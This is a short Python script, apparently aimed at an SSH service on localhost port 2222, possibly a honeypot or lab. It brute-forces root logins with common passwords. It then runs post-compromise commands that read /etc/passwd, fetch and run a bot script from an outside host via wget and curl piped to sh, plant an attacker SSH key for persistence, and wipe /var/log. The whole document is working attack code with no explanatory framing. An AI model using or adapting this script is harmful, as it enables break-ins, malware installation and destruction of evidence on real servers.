import paramiko, time
def login(u, p):
    c = paramiko.SSHClient(); c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        c.connect("127.0.0.1", port=2222, username=u, password=p, allow_agent=False, look_for_keys=False, timeout=10)
        return c
    except Exception as e:
        print(f"[-] {u}:{p} -> {type(e).__name__}"); return None
c = None
for u, p in [("root","root"),("root","123456"),("root","password"),("root","toor")]:
    c = login(u, p)
    if c: print(f"[+] Login OK {u}:{p}"); break
sh = c.invoke_shell(); time.sleep(1); sh.recv(4096)
for cmd in ["uname -a","whoami","cat /etc/passwd","ls -la /root","wget http://203.0.113.5/bot.sh -O /tmp/bot.sh","chmod +x /tmp/bot.sh","echo 'ssh-rsa AAAAB3Nza attacker@evil' >> ~/.ssh/authorized_keys","curl -s http://203.0.113.5/x | sh","rm -rf /var/log/*","exit"]:
    sh.send(cmd+"\n"); time.sleep(1.5); print(f"$ {cmd}\n{sh.recv(8192).decode(errors='replace')[:250]}")
c.close()
